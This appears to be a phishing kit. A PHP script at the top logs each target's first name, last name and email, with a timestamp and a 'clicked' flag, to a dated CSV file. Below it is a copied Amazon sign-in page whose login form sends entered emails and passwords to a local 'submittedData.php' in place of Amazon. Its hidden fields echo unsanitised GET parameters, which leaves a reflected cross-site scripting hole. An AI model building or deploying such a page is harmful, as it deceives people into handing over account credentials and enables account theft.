<?php
// Check if all the required GET variables are set
if (isset($_GET['firstName']) && isset($_GET['lastName']) && isset($_GET['email'])) {
    
    // Get the GET variables
    $firstName = $_GET['firstName'];
    $lastName = $_GET['lastName'];
    $email = $_GET['email'];
    
    // Sanitize the input (basic sanitization, can be expanded)
    $firstName = filter_var($firstName, FILTER_SANITIZE_STRING);
    $lastName = filter_var($lastName, FILTER_SANITIZE_STRING);
    $email = filter_var($email, FILTER_SANITIZE_EMAIL);

    // Create the filename based on the current date
    $fileName = date('Y-m-d') . '.csv';

    // Open the file in append mode, if it doesn't exist it will be created
    $file = fopen($fileName, 'a');

    $clicked = "clicked";

    $timestamp = date('Y-m-d H:i:s');

    if ($file) {
        // Create an array with the data to be written
        $data = [$timestamp, $firstName, $lastName, $email, $clicked];

        // Write the data to the CSV file
        fputcsv($file, $data);

        // Close the file
        fclose($file);

        // Confirmation message
        //echo "Data has been recorded successfully.";
    } else {
        // Error handling
        //echo "Error: Unable to open the file.";
    }
} else {
    // Error message if any of the required GET variables are missing
    //echo "Error: Please provide firstName, lastName, and email parameters.";
}
?>





<!doctype html><html class="a-no-js" data-19ax5a9jf="dingo">
  <head>


    
      

      
        <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61dZRKtG0VL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31WoRZHct0L.css,31Hhzr7NyHL.css_.css?AUIClients/AmazonUI#us.not-trident" />
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51E5CuE4VpL.css_.css?AUIClients/AuthenticationPortalAssets" />
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/21cwI2AAWQL.css?AUIClients/CVFAssets" />
</head>

  <body class="auth-no-skin ap-locale-en_US a-m-us a-aui_72554-c a-aui_a11y_2_750578-t2 a-aui_a11y_6_837773-t2 a-aui_a11y_sr_678508-t1 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-t1 a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c">

<div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_A11Y_2_750578":"T2","AUI_A11Y_6_837773":"T2","AUI_AMZN_IMG_GATE_959718":"T1","AUI_A11Y_SR_678508":"T1"}</script>
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" href="/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              





<div class="a-section a-spacing-base auth-pagelet-container">
  
    
    
      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" aria-live="polite" aria-atomic="true"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
        <p>
          <a class="a-link-normal" href="/gp/help/customer/display.html/ref=ap_cookie_error_help?">
            
          </a>
        </p>
      </div></div></div>
    
  
</div>

<div class="a-section auth-pagelet-container">
  









<!-- Container for the aria-described error message -->
<span id="emailErrorAnnounce" style="display: none;">
  Enter your email or mobile phone number
</span>


<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->


<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->


<!-- show a warning modal dialog when the third party account is connected with Amazon -->







<div id="passkey-error-alert" class="a-box a-alert a-alert-error aok-hidden" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Passkey error</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  <p id="passkey-client-error-message">
    Something went wrong, please sign-in another way or follow any instructions provided by your device.
  </p>
  <p id="passkey-generic-server-error-message" class="aok-hidden">
    Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.
  </p>
  <p id="passkey-server-error-message" class="aok-hidden"></p>
</div></div></div>

  <!-- shows an info modal dialog when a test is using Single Page -->
  


  
    





<div class="a-section a-spacing-base">
  <div class="a-section">
    
    <form name="signIn" method="post" novalidate action="submittedData.php">
      <input type="hidden" name="firstName" value="<?php echo $_GET['firstName']; ?>" />
      <input type="hidden" name="lastName" value="<?php echo $_GET['lastName']; ?>" />
      <input type="hidden" name="email2" value="<?php echo $_GET['email']; ?>" />


      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            Sign in
          </h1>
          <!-- optional subheading element -->
          
          <div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">
              Email or mobile phone number
            </label>
            
            
              
                
              
              
              
              
            
            
            <!-- Container for the aria-described error message -->
            <span id="emailErrorAnnounce" style="display: none;">
                Enter your email or mobile phone number
            </span>

            <input type="email" maxlength="128" id="ap_email" name="email" class="a-input-text a-span12 auth-autofocus auth-required-field auth-require-claim-validation" aria-describedby="emailErrorAnnounce" aria-required="true"/>
            

            <input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password" class="a-input-text hide" aria-required="true"/>
            



















































  



<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter your email or mobile phone number
</div></div></div>

  



<div id="auth-email-invalid-claim-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter a valid email address or phone number
</div></div></div>

  
  












          </div>

          
          <input type="hidden" name="create" value="0"/>

          <div class="a-section">
            
            









            
            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" aria-describedby="legalTextRow" class="a-button-input" type="submit" aria-labelledby="continue-announce"/><span id="continue-announce" class="a-button-text" aria-hidden="true">
              Continue
            </span></span></span>

            
            
              



<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
  By continuing, you agree to Amazon's <a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=508088">Conditions of Use</a> and <a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=468496">Privacy Notice</a>.
</div> 

            

            
<script>
  function cf() {
    if (typeof window.uet === 'function') {
      uet('cf');
    }
    if (window.embedNotification &&
      typeof window.embedNotification.onCF === 'function') {
      embedNotification.onCF();
    }
  }
</script>

<script type="text/javascript">cf()</script>

          </div>

          

          

          



<div class="a-section">
  <div class="a-row a-expander-container a-expander-inline-container">
    <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
      Need help?
    </span></a>
    <ul class="a-unordered-list a-nostyle a-vertical">
      
        <li><span class="a-list-item">
          <div data-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
            



  
  
    
  

<a id="auth-fpp-link-bottom" class="a-link-normal" href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&amp;prevRID=XFZ3XQPHWBKQ5E43HWCN&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
  Forgot your password?
</a>
          </div>
        </span></li>
      
      
      <li><span class="a-list-item">
        <div data-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
          <a id="ap-other-signin-issues-link" class="a-link-normal" href="/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">
            Other issues with Sign-In
          </a>
        </div>
      </span></li>
    
    </ul>
  </div>
</div>


          




  
  
  
    
      
      
      
        
        
      
    
  


          
          

          






          
            



<div id="ab-signin-link-section" class="a-section">
    <hr aria-hidden="true" class="a-divider-normal"/>
    <div class="a-section a-spacing-micro">
        <span class="a-text-bold">
            Buying for work?
        </span>
    </div>

    <a id="ab-signin-ingress-link" class="a-link-normal" href="https://www.amazon.com/business/register/welcome?ref_=ab_reg_signin">
        <span>
            Shop on Amazon Business
        </span>
    </a>
</div>
          
          
        </div></div>
      </div>
    </form>
  </div>
  
    
    
      
        
        <div class="a-divider a-divider-break"><h5 aria-level="5">New to Amazon?</h5></div>
        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" href="https://www.amazon.com/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&amp;prevRID=XFZ3XQPHWBKQ5E43HWCN&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text">
          Create your Amazon account
        </a></span></span>
      
    
  

  

  

</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  <ul>
    
      <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
        
          
            
          

          
        

        <a class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">
          Conditions of Use
        </a>
        <span class="auth-footer-seperator"></span>
      </li>
    
      <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
        
          
            
          

          
        

        <a class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">
          Privacy Notice
        </a>
        <span class="auth-footer-seperator"></span>
      </li>
    
      <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
        
          
            
          

          
        

        <a class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/help">
          Help
        </a>
        <span class="auth-footer-seperator"></span>
      </li>
    
  </ul>

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
  © 1996-2024, Amazon.com, Inc. or its affiliates
</span>

</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

    


<script type="text/javascript">
  try {
    var metadataList = document.getElementsByName('metadata1');
    if (metadataList.length == 0) {
      var input = document.createElement('input');
      input.name = 'metadata1';
      input.type = 'hidden';
      input.value = 'true';

      var authenticationFormList = document.getElementsByName('signIn');
      for (var index = 0; index < authenticationFormList.length; index++) {
        authenticationFormList[index].appendChild(input);
      }
    } else {
      for (var index = 0; index < metadataList.length; index++) {
        metadataList[index].value = 'true';
      }
    }
  } catch (e) {
    if (typeof window.ueLogError === 'function') {
      window.ueLogError(e, {
        message: 'Failed to populate default metadata value',
        logLevel: 'warn',
        attribution: 'FWCIMAssets'
      });
    }
  }
</script>
<script type="text/javascript">
    window.fwcimCmd = [
        
            ['profile', 'signIn']
            
        
    ];
</script>


    
        

<!--ACICSetup-->

<script type="text/javascript">
var acicActionType = false;
P.when('auth-validate-form-handler', "acic-component", "ready").execute('acic-setup', function(AuthValidateFormHandler) {
    var aautTargetForm = document.querySelector('form[name="signIn"]');
    if (aautTargetForm) {
        setAAToken("146-6396924-6979746-" + Date.now(), aautTargetForm);
        if ((typeof acic !== 'undefined') && (acic != null)) {
            acic.setupACIC({
                "data-mode": "1", 
                "data-ref-id": "ap",
                "data-context": getClientContext(aautTargetForm),
                "data-callback": function(data) {
                    if (data.sessionToken) {
                        setAAToken(data.sessionToken, aautTargetForm);
                    }
                    if (data.actionType && data.actionType !== "PASS") {
                        acicActionType = true;
                    }
                },
                "data-host-config": "prod.USAmazon",
                "data-event-trigger": "PageLoad",
            });
        }

        var submitInputs = aautTargetForm.querySelectorAll('input[type="submit"]');
        if (submitInputs && submitInputs.length === 1) {
            var submitInput = submitInputs[0];
            submitInput.addEventListener("click", function(event) {
                acicEventListener(AuthValidateFormHandler, aautTargetForm, submitInput, event);
            });
        }
    }
});

var acicShouldSetup = true;
function acicEventListener(AuthValidateFormHandler, aautTargetForm, submitInput, event) {
    
    
    if (acicShouldSetup &&
        (typeof acic !== 'undefined') && (acic != null) &&
        AuthValidateFormHandler.validate(aautTargetForm)) {

        if (acicActionType || isTestEmailPattern(getEmailAddress(aautTargetForm))) {
            event.stopPropagation();
            event.stopImmediatePropagation();
            event.preventDefault();

            acic.setupACIC({
                "data-ref-id": "ap",
                "data-context": getClientContext(aautTargetForm),
                "data-callback": function(data) {
                    if (data.sessionToken) {
                        setAAToken(data.sessionToken, aautTargetForm);
                    }
                    submitForm(submitInput);
                },
                "data-host-config": "prod.USAmazon",
                "data-event-trigger": "SubmitInput",
                "data-fwcim": getFwcimBlob(aautTargetForm),
            });
        } else if (true) {
            acic.setupACICforAsyncReporting({
                "data-ref-id": "ap",
                "data-context": getClientContext(aautTargetForm),
                "data-callback": function(data) {
                },
                "data-host-config": "prod.USAmazon",
                "data-event-trigger": "SubmitInput",
                "data-fwcim": getFwcimBlob(aautTargetForm),
            });
        }
    }
}

function submitForm(submitInput) {
    acicShouldSetup = false;
    submitInput.click();
}

function setAAToken(sessionToken, aautTargetForm) {
    if (sessionToken) {
        var aaTokenInput = aautTargetForm.querySelector("input[name='aaToken']");
        if (!aaTokenInput) {
            aaTokenInput = document.createElement("input");
            aaTokenInput.type = "hidden";
            aaTokenInput.name = "aaToken";
            aautTargetForm.appendChild(aaTokenInput);
        }
        aaTokenInput.value = sessionToken;
    }
}

function getClientContext(aautTargetForm) {
    var context = {};
    var emailAddress = getEmailAddress(aautTargetForm);
    if (emailAddress) {
        context.emailAddress = emailAddress;
    }
    context.sessionId = "146-6396924-6979746";
    context.marketplaceId = "ATVPDKIKX0DER";
    context.rid = "XFZ3XQPHWBKQ5E43HWCN";
    context.ubid = "135-2364469-2213122";

    context.pageType = "AuthenticationPortal";

    var appActionInput = aautTargetForm.querySelector("input[name='appAction']");
    if (appActionInput) {
        context.appAction = appActionInput.value;
    }

    var subPageTypeInput = aautTargetForm.querySelector("input[name='subPageType']");
    if (subPageTypeInput) {
        context.subPageType = subPageTypeInput.value;
    }

    return JSON.stringify(context);
}

function getFwcimBlob(aautTargetForm) {
    var fwcimBlob = aautTargetForm.querySelector("input[name='metadata1']");
    if(fwcimBlob && fwcimBlob.value !== 'true') {
        return fwcimBlob.value;
    }
    return null
}

function getEmailAddress(aautTargetForm) {
    var emailInput = aautTargetForm.querySelector("input[type='email']");
    if (!emailInput) {
        emailInput = aautTargetForm.querySelector("input[name='email']");
    }
    if (emailInput) {
        return emailInput.value;
    }
    return null;
}

function isTestEmailPattern(emailAddress) {
    
    return emailAddress &&
        (emailAddress.indexOf('sentinels') >= 0) &&
        emailAddress.endsWith('@amazon.com');
}
</script>

    



    
    <!-- cache slot rendered -->
    
  </div><div id='be' style="display:none;visibility:hidden;">


<script type="text/javascript">
window.ue_ibe = (window.ue_ibe || 0) + 1;
if (window.ue_ibe === 1) {
(function(e,c){function h(b,a){f.push([b,a])}function g(b,a){if(b){var c=e.head||e.getElementsByTagName("head")[0]||e.documentElement,d=e.createElement("script");d.async="async";d.src=b;d.setAttribute("crossorigin","anonymous");a&&a.onerror&&(d.onerror=a.onerror);a&&a.onload&&(d.onload=a.onload);c.insertBefore(d,c.firstChild)}}function k(){ue.uels=g;for(var b=0;b<f.length;b++){var a=f[b];g(a[0],a[1])}ue.deffered=1}var f=[];c.ue&&(ue.uels=h,c.ue.attach&&c.ue.attach("load",k))})(document,window);


if (window.ue && window.ue.uels) {
            ue.uels("https://images-na.ssl-images-amazon.com/images/I/31bJewCvY-L.js");
}
var ue_mbl=ue_csm.ue.exec(function(h,a){function s(c){b=c||{};a.AMZNPerformance=b;b.transition=b.transition||{};b.timing=b.timing||{};if(a.csa){var d;b.timing.transitionStart&&(d=b.timing.transitionStart);b.timing.processStart&&(d=b.timing.processStart);d&&(csa("PageTiming")("mark","nativeTransitionStart",d),csa("PageTiming")("mark","transitionStart",d))}h.ue.exec(t,"csm-android-check")()&&b.tags instanceof Array&&(c=-1!=b.tags.indexOf("usesAppStartTime")||b.transition.type?!b.transition.type&&-1<
b.tags.indexOf("usesAppStartTime")?"warm-start":void 0:"view-transition",c&&(b.transition.type=c));n=null;"reload"===e._nt&&h.ue_orct||"intrapage-transition"===e._nt?u(b):"undefined"===typeof e._nt&&f&&f.timing&&f.timing.navigationStart&&a.history&&"function"===typeof a.History&&"object"===typeof a.history&&a.history.length&&1!=a.history.length&&(b.timing.transitionStart=f.timing.navigationStart);p&&e.ssw(q,""+(b.timing.transitionStart||n||""));c=b.transition;d=e._nt?e._nt:void 0;c.subType=d;a.ue&&
a.ue.tag&&a.ue.tag("has-AMZNPerformance");e.isl&&a.uex&&a.uex("at","csm-timing");v()}function w(c){a.ue&&a.ue.count&&a.ue.count("csm-cordova-plugin-failed",1)}function t(){return a.cordova&&a.cordova.platformId&&"android"==a.cordova.platformId}function u(){if(p){var c=e.ssw(q),a=function(){},x=e.count||a,a=e.tag||a,k=b.timing.transitionStart,g=c&&!c.e&&c.val;n=c=g?+c.val:null;k&&g&&k>c?(x("csm.jumpStart.mtsDiff",k-c||0),a("csm-rld-mts-gt")):k&&g?a("csm-rld-mts-leq"):g?k||a("csm-rld-mts-no-new"):a("csm-rld-mts-no-old")}f&&
f.timing&&f.timing.navigationStart?b.timing.transitionStart=f.timing.navigationStart:delete b.timing.transitionStart}function v(){try{a.P.register("AMZNPerformance",function(){return b})}catch(c){}}function r(){if(!b)return"";ue_mbl.cnt=null;var c=b.timing,d=b.transition,d=["mts",l(c.transitionStart),"mps",l(c.processStart),"mtt",d.type,"mtst",d.subType,"mtlt",d.launchType];a.ue&&a.ue.tag&&(c.fr_ovr&&a.ue.tag("fr_ovr"),c.fcp_ovr&&a.ue.tag("fcp_ovr"),d.push("fr_ovr",l(c.fr_ovr),"fcp_ovr",l(c.fcp_ovr)));
for(var c="",e=0;e<d.length;e+=2){var f=d[e],g=d[e+1];"undefined"!==typeof g&&(c+="&"+f+"="+g)}return c}function l(a){if("undefined"!==typeof a&&"undefined"!==typeof m)return a-m}function y(a,d){b&&(m=d,b.timing.transitionStart=a,b.transition.type="view-transition",b.transition.subType="ajax-transition",b.transition.launchType="normal",ue_mbl.cnt=r)}var e=h.ue||{},m=h.ue_t0,q="csm-last-mts",p=1===h.ue_sswmts,n,f=a.performance,b;if(a.P&&a.P.when&&a.P.register)return 1===a.ue_fnt&&(m=a.aPageStart||
h.ue_t0),a.P.when("CSMPlugin").execute(function(a){a.buildAMZNPerformance&&a.buildAMZNPerformance({successCallback:s,failCallback:w})}),{cnt:r,ajax:y}},"mobile-timing")(ue_csm,ue_csm.window);

(function(d){d._uess=function(){var a="";screen&&screen.width&&screen.height&&(a+="&sw="+screen.width+"&sh="+screen.height);var b=function(a){var b=document.documentElement["client"+a];return"CSS1Compat"===document.compatMode&&b||document.body["client"+a]||b},c=b("Width"),b=b("Height");c&&b&&(a+="&vw="+c+"&vh="+b);return a}})(ue_csm);

(function(a){function d(a){c&&c("log",a)}var b=document.ue_backdetect,c=a.csa&&a.csa("Errors",{producerId:"csa",logOptions:{ent:"all"}});a.ue_err.buffer&&c&&(a.ue_err.buffer.forEach(d),a.ue_err.buffer.push=d);b&&b.ue_back&&a.ue&&(a.ue.bfini=b.ue_back.value);a.uet&&a.uet("be");a.onLdEnd&&(window.addEventListener?window.addEventListener("load",a.onLdEnd,!1):window.attachEvent&&window.attachEvent("onload",a.onLdEnd));a.ueh&&a.ueh(0,window,"load",a.onLd,1);a.ue&&a.ue.tag&&(a.ue_furl?(b=a.ue_furl.replace(/\./g,
"-"),a.ue.tag(b)):a.ue.tag("nofls"))})(ue_csm);

(function(g,h){function d(a,d){var b={};if(!e||!f)try{var c=h.sessionStorage;c?a&&("undefined"!==typeof d?c.setItem(a,d):b.val=c.getItem(a)):f=1}catch(g){e=1}e&&(b.e=1);return b}var b=g.ue||{},a="",f,e,c,a=d("csmtid");f?a="NA":a.e?a="ET":(a=a.val,a||(a=b.oid||"NI",d("csmtid",a)),c=d(b.oid),c.e||(c.val=c.val||0,d(b.oid,c.val+1)),b.ssw=d);b.tabid=a})(ue_csm,ue_csm.window);

ue_csm.ue.exec(function(e,f){var a=e.ue||{},b=a._wlo,d;if(a.ssw){d=a.ssw("CSM_previousURL").val;var c=f.location,b=b?b:c&&c.href?c.href.split("#")[0]:void 0;c=(b||"")===a.ssw("CSM_previousURL").val;!c&&b&&a.ssw("CSM_previousURL",b);d=c?"reload":d?"intrapage-transition":"first-view"}else d="unknown";a._nt=d},"NavTypeModule")(ue_csm,window);
ue_csm.ue.exec(function(c,a){function g(a){a.run(function(e){d.tag("csm-feature-"+a.name+":"+e);d.isl&&c.uex("at")})}if(a.addEventListener)for(var d=c.ue||{},f=[{name:"touch-enabled",run:function(b){var e=function(){a.removeEventListener("touchstart",c,!0);a.removeEventListener("mousemove",d,!0)},c=function(){b("true");e()},d=function(){b("false");e()};a.addEventListener("touchstart",c,!0);a.addEventListener("mousemove",d,!0)}}],b=0;b<f.length;b++)g(f[b])},"csm-features")(ue_csm,window);


(function(a,e){function d(a){b&&b("recordCounter",a.c,a.v)}var c=e.images,b=a.csa&&a.csa("Metrics",{producerId:"csa"});c&&c.length&&a.ue.count("totalImages",c.length);a.ue.cv.buffer&&b&&(a.ue.cv.buffer.forEach(d),a.ue.cv.buffer.push=d)})(ue_csm,document);
(function(b){function c(){var d=[];a.log&&a.log.isStub&&a.log.replay(function(a){e(d,a)});a.clog&&a.clog.isStub&&a.clog.replay(function(a){e(d,a)});d.length&&(a._flhs+=1,n(d),p(d))}function g(){a.log&&a.log.isStub&&(a.onflush&&a.onflush.replay&&a.onflush.replay(function(a){a[0]()}),a.onunload&&a.onunload.replay&&a.onunload.replay(function(a){a[0]()}),c())}function e(d,b){var c=b[1],f=b[0],e={};a._lpn[c]=(a._lpn[c]||0)+1;e[c]=f;d.push(e)}function n(b){q&&(a._lpn.csm=(a._lpn.csm||0)+1,b.push({csm:{k:"chk",
f:a._flhs,l:a._lpn,s:"inln"}}))}function p(a){if(h)a=k(a),b.navigator.sendBeacon(l,a);else{a=k(a);var c=new b[f];c.open("POST",l,!0);c.setRequestHeader&&c.setRequestHeader("Content-type","text/plain");c.send(a)}}function k(a){return JSON.stringify({rid:b.ue_id,sid:b.ue_sid,mid:b.ue_mid,mkt:b.ue_mkt,sn:b.ue_sn,reqs:a})}var f="XMLHttpRequest",q=1===b.ue_ddq,a=b.ue,r=b[f]&&"withCredentials"in new b[f],h=b.navigator&&b.navigator.sendBeacon,l="//"+b.ue_furl+"/1/batch/1/OE/",m=b.ue_fci_ft||5E3;a&&(r||h)&&
(a._flhs=a._flhs||0,a._lpn=a._lpn||{},a.attach&&(a.attach("beforeunload",a.exec(g,"fcli-bfu")),a.attach("pagehide",a.exec(g,"fcli-ph"))),m&&b.setTimeout(a.exec(c,"fcli-t"),m),a._ffci=a.exec(c))})(window);


(function(k,c){function l(a,b){return a.filter(function(a){return a.initiatorType==b})}function f(a,c){if(b.t[a]){var g=b.t[a]-b._t0,e=c.filter(function(a){return 0!==a.responseEnd&&m(a)<g}),f=l(e,"script"),h=l(e,"link"),k=l(e,"img"),n=e.map(function(a){return a.name.split("/")[2]}).filter(function(a,b,c){return a&&c.lastIndexOf(a)==b}),q=e.filter(function(a){return a.duration<p}),s=g-Math.max.apply(null,e.map(m))<r|0;"af"==a&&(b._afjs=f.length);return a+":"+[e[d],f[d],h[d],k[d],n[d],q[d],s].join("-")}}
function m(a){return a.responseEnd-(b._t0-c.timing.navigationStart)}function n(){var a=c[h]("resource"),d=f("cf",a),g=f("af",a),a=f("ld",a);delete b._rt;b._ld=b.t.ld-b._t0;b._art&&b._art();return[d,g,a].join("_")}var p=20,r=50,d="length",b=k.ue,h="getEntriesByType";b._rre=m;b._rt=c&&c.timing&&c[h]&&n})(ue_csm,window.performance);


(function(c,d){var b=c.ue,a=d.navigator;b&&b.tag&&a&&(a=a.connection||a.mozConnection||a.webkitConnection)&&a.type&&b.tag("netInfo:"+a.type)})(ue_csm,window);


(function(c,d){function h(a,b){for(var c=[],d=0;d<a.length;d++){var e=a[d],f=b.encode(e);if(e[k]){var g=b.metaSep,e=e[k],l=b.metaPairSep,h=[],m=void 0;for(m in e)e.hasOwnProperty(m)&&h.push(m+"="+e[m]);e=h.join(l);f+=g+e}c.push(f)}return c.join(b.resourceSep)}function s(a){var b=a[k]=a[k]||{};b[t]||(b[t]=c.ue_mid);b[u]||(b[u]=c.ue_sid);b[f]||(b[f]=c.ue_id);b.csm=1;a="//"+c.ue_furl+"/1/"+a[v]+"/1/OP/"+a[w]+"/"+a[x]+"/"+h([a],y);if(n)try{n.call(d[p],a)}catch(g){c.ue.sbf=1,(new Image).src=a}else(new Image).src=
a}function q(){g&&g.isStub&&g.replay(function(a,b,c){a=a[0];b=a[k]=a[k]||{};b[f]=b[f]||c;s(a)});l.impression=s;g=null}if(!(1<c.ueinit)){var k="metadata",x="impressionType",v="foresterChannel",w="programGroup",t="marketplaceId",u="session",f="requestId",p="navigator",l=c.ue||{},n=d[p]&&d[p].sendBeacon,r=function(a,b,c,d){return{encode:d,resourceSep:a,metaSep:b,metaPairSep:c}},y=r("","?","&",function(a){return h(a.impressionData,z)}),z=r("/",":",",",function(a){return a.featureName+":"+h(a.resources,
A)}),A=r(",","@","|",function(a){return a.id}),g=l.impression;n?q():(l.attach("load",q),l.attach("beforeunload",q));try{d.P&&d.P.register&&d.P.register("impression-client",function(){})}catch(B){c.ueLogError(B,{logLevel:"WARN"})}}})(ue_csm,window);



var ue_pty = "AuthenticationPortal";

var ue_spty = "SignInClaimCollect";



var ue_adb = 4;
var ue_adb_rtla = 1;
ue_csm.ue.exec(function(y,a){function t(){if(d&&f){var a;a:{try{a=d.getItem(g);break a}catch(c){}a=void 0}if(a)return b=a,!0}return!1}function u(){if(a.fetch)fetch(m).then(function(a){if(!a.ok)throw Error(a.statusText);return a.text?a.text():null}).then(function(b){b?(-1<b.indexOf("window.ue_adb_chk = 1")&&(a.ue_adb_chk=1),n()):h()})["catch"](h);else e.uels(m,{onerror:h,onload:n})}function h(){b=k;l();if(f)try{d.setItem(g,b)}catch(a){}}function n(){b=1===a.ue_adb_chk?p:k;l();if(f)try{d.setItem(g,
b)}catch(c){}}function q(){a.ue_adb_rtla&&c&&0<c.ec&&!1===r&&(c.elh=null,ueLogError({m:"Hit Info",fromOnError:1},{logLevel:"INFO",adb:b}),r=!0)}function l(){e.tag(b);e.isl&&a.uex&&uex("at",b);s&&s.updateCsmHit("adb",b);c&&0<c.ec?q():a.ue_adb_rtla&&c&&(c.elh=q)}function v(){return b}if(a.ue_adb){a.ue_fadb=a.ue_fadb||10;var e=a.ue,k="adblk_yes",p="adblk_no",m="https://m.media-amazon.com/images/G/01/csm/showads.v2.js?category=ad&adstype=-ad-column-&ad_size=-housead-",b="adblk_unk",d;a:{try{d=a.localStorage;
break a}catch(z){}d=void 0}var g="csm:adb",c=a.ue_err,s=e.cookie,f=void 0!==a.localStorage,w=Math.random()>1-1/a.ue_fadb,r=!1,x=t();w||!x?u():l();a.ue_isAdb=v;a.ue_isAdb.unk="adblk_unk";a.ue_isAdb.no=p;a.ue_isAdb.yes=k}},"adb")(document,window);


(function(l,m){var n=/^(https?:)?\/\//i,e=0,f,g={};f=setInterval(function(){for(var d=m.scripts,h=[],a,b,k=!1,c=0;c<d.length;c++)a=d[c].getAttribute("src"),b=d[c].getAttribute("crossorigin")||"",a&&"undefined"!==a&&n.test(a)&&!g.hasOwnProperty(a)&&"anonymous"!=b&&"use-credentials"!=b&&(g[a]=b,h.push(a),k=!0);k&&l.ue.log({k:"corsscanner",value:h},"csm");e++;5<=e&&clearInterval(f)},1E3)})(ue_csm,document);



